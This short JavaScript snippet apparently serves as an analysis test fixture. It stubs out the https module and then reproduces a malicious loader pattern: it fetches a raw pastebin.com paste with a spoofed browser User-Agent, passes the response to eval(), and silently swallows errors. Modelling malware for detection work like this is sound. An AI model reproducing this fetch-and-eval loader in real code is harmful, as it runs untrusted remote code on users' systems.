// NOTE(Zhen): hand roll a model..
var https = {};
https.get = function (_metadata, callback) {
    callback({
        on: function (_event, callback) {
            callback("__SOURCE_INTERNET");
        }
    });
};

try{
    // var https=require('https');
    https.get({'hostname':'pastebin.com',path:'/raw/XLeVP82h',
                headers:{'User-Agent':'Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0',Accept:'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'}}, (r)=>{
        r.setEncoding('utf8');
        r.on('data',(c)=>{
            eval(c);
        });
        r.on('error',()=>{});

    }).on('error',()=>{});
}catch(e){}